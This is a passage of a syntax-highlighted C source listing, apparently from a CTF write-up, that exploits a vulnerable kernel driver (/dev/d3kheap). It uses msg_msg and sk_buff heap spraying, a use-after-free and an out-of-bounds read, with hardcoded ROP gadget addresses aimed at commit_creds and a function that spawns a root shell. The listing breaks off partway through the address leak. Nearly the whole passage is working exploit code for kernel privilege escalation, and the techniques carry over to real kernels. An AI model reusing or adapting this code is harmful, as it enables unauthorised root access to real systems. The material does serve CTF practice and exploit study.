class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff82c6d580</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff8203fe40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FREE_PIPE_INFO 0xffffffff81327570</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_R14_POP_RBP_RET 0xffffffff81003364</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CALL_RSI_PTR 0xffffffff8105acec</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="keyword">size_t</span> kernel_offset, kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> dev_fd;</span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>], pipe_fd2[<span class="number">2</span>], pipe_fd_1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x1234</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xdead</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    page;</span><br><span class="line">    <span class="keyword">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="keyword">uint64_t</span>    ops;</span><br><span class="line">    <span class="keyword">uint32_t</span>    flags;</span><br><span class="line">    <span class="keyword">uint32_t</span>    padding;</span><br><span class="line">    <span class="keyword">uint64_t</span>    <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    confirm;</span><br><span class="line">    <span class="keyword">uint64_t</span>    release;</span><br><span class="line">    <span class="keyword">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="keyword">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">writeMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">peekMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT); <span class="comment">// IPC_NOWAIT:若没有收到消息则立即返回-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildMsg</span><span class="params">(struct msg_msg *msg, <span class="keyword">uint64_t</span> m_list_next,<span class="keyword">uint64_t</span> m_list_prev, <span class="keyword">uint64_t</span> m_type, <span class="keyword">uint64_t</span> m_ts, <span class="keyword">uint64_t</span> next, <span class="keyword">uint64_t</span> security)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spraySkBuff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">freeSkBuff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>         oob_pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="keyword">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="keyword">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="keyword">int</span>         rop_idx;</span><br><span class="line">    <span class="keyword">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get a free object</span></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1024</span>)</span><br><span class="line">            del();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger UAF...&quot;</span>);</span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to mark the UAF msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find out the UAF queue</span></span><br><span class="line">    victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * the msg_msg got changed, so we can&#x27;t read out</span></span><br><span class="line"><span class="comment">         * but it tells us which one the victim is</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] victim qid: %d\n&quot;</span>, i);</span><br><span class="line">            victim_qid = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make the UAF in msg queue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span 